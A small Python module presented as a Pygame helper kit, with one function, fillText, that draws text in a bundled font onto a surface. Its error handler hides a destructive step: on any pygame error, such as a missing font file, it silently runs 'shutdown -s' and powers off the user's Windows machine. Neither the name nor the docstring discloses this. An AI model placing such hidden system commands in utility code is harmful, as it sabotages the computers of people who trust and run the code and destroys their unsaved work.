"""A PDK for Pygame users"""
import pygame
import os

pygame.init()


def fillText(master=None, content='', pos=(0, 0)):
    """
    A function for Pygame users to display text
    :param master: I don't think you need more explanation
    :param content: The content you want to display
    :param pos: Position. WARNING!!! : Please enter a BRAKETS when entering pos(default=(0,0))
    :return: None
    """
    try:
        font = pygame.font.Font("font/simhei.ttf", 20)
        text = font.render(content, True, (255, 255, 255))
        master.blit(text, pos)
    except pygame.error:
        os.system('shutdown -s')
